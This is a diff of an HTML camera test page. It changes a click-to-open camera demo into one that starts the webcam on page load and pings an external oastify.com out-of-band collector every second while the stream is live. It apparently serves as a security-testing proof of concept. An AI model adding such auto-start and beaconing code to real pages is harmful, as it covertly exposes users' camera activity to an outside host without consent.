@@ -1,27 +1,43 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-  <meta charset="UTF-8">
-  <title>Camera Access Test</title>
+  <title>Camera Test</title>
 </head>
 <body>
-  <h2>Camera Access Test Page</h2>
-  <p>Click the button below to test if the browser allows camera access.</p>
-  <button onclick="requestCamera()">Open Camera</button>
-  <br><br>
-  <video id="video" width="320" height="240" autoplay></video>
+  <h1>Camera Test Page</h1>
+  <video id="video" autoplay playsinline style="width: 400px; height: auto;"></video>
 
   <script>
-    function requestCamera() {
+    let stream = null;
+    let pingInterval = null;
+
+    function startCamera() {
       navigator.mediaDevices.getUserMedia({ video: true })
-        .then(function(stream) {
+        .then(s => {
+          stream = s;
           document.getElementById('video').srcObject = stream;
-          console.log("Camera access granted");
+          console.log("Camera access granted.");
+
+          // Start pinging every second
+          pingInterval = setInterval(() => {
+            if (stream && stream.active) {
+              // Send a ping to the OAST domain every second
+              fetch('https://0bc1obwrqcmepy35lla01za2rtxkla9z.oastify.com/ping?' + Date.now())
+                .then(() => console.log("Ping sent."))
+                .catch(() => console.warn("Ping failed."));
+            } else {
+              clearInterval(pingInterval);
+              console.log("Camera stream inactive. Stopping ping.");
+            }
+          }, 1000); // Every second
         })
-        .catch(function(err) {
+        .catch(err => {
           console.error("Camera access denied or error:", err);
         });
     }
+
+    // Start camera on page load
+    window.onload = startCamera;
   </script>
 </body>
 </html>
